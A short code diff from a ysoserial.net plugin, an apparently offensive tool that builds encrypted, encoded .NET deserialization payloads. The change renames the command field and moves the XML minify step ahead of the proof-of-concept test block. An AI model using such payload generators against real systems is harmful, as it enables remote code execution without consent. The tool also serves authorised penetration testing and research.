@@ -64,7 +64,7 @@ namespace ysoserial.Plugins
             try
             {
                 extra = options.Parse(args);
-                inputArgs.CmdFullString = command;
+                inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
                 inputArgs.Test = test;
@@ -104,6 +104,12 @@ namespace ysoserial.Plugins
             byte[] encryptedEncoded = myProtectedDataCookieTransform.Encode(deflateEncoded);
             payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));
 
+            
+            if (minify)
+            {
+                payload = XMLMinifier.Minify(payload, null, null);
+            }
+
             if (test)
             {
                 // PoC on how it works in practice
@@ -117,11 +123,6 @@ namespace ysoserial.Plugins
                 {
                     // there will be an error!
                 }
-            }
-
-            if (minify)
-            {
-                payload = XMLMinifier.Minify(payload, null, null);
             }
 
             return payload;
